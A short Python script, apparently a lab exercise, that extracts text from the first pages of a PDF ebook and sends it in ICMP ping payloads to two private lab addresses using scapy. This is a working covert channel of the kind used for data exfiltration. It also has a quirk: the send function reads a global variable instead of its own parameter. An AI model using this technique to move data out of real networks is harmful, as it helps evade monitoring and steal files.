#https://www.geeksforgeeks.org/working-with-pdf-files-in-python/
#


from scapy.all import *
import math
from pypdf import PdfReader
import time

#ip = "192.168.56.101"
lista_destinazioni = ["192.168.56.101", "192.168.56.102"]

file="payload.txt"
reader = PdfReader("Becoming a better programmer_100954 (1).pdf")

def sanitize(s: str) -> str: 
    return s.replace(" ", "_")

def sendPage(pageText=None, indexPage=0):
    if pageText is None:
        return
    block=150 #dimensione in byte del blocco
    for i in range(0,len(stringa),block): 
        print("Carattere {car} mandato a {ip}".format(
            car=stringa[i:i+block], 
            ip=lista_destinazioni[i%len(lista_destinazioni)]
        ))
        destinazione=lista_destinazioni[i%len(lista_destinazioni)]

        sequenza=math.ceil(i/block) 

        pkt = IP(dst=destinazione)/ICMP(
            id=indexPage, 
            seq=sequenza
            ) / stringa[i:i+block]
        ans = sr1(pkt, timeout=2, verbose=1)

        #if ans:
            #print(f"{ip} is alive")
            #ans.show()
        #else:
            #print(f"{ip} is not responding")
            #print("No reply")


print("Num of pages is {pages}".format(pages=len(reader.pages)))
for page in range(len(reader.pages)):
    stringa=reader.pages[page].extract_text()
    print("Page {page} is {text}\n\n".format(
        page=page, 
        text=stringa
    ))
    sendPage(stringa, page)
    time.sleep(2)
    if page==5:
        break






